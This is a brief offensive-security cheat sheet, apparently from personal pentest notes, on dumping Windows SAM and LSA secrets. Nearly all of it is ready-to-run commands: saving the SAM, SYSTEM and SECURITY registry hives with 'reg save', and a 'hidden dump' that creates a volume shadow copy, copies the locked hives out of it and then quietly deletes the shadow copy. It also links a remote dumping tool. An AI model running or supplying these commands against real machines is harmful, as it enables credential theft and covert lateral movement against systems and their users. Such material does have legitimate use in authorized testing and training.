# SAM & LSA secrets

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#secrets-dump" %}

[**Remote dumper**](https://github.com/jfjallid/go-secdump)

### Dump <a href="#theory" id="theory"></a>

```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

### Hidden dump

```powershell
wmic shadowcopy call create Volume='C:\'
```

list avaible shadow copies&#x20;

```powershell
vssadmin.exe list shadows
```

copy registry keys

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\ProgramData\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\ProgramData\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ProgramData\SYSTEM
```

remove shadow copy

```powershell
vssadmin.exe delete shadows /shadow={UUID} /quiet
```
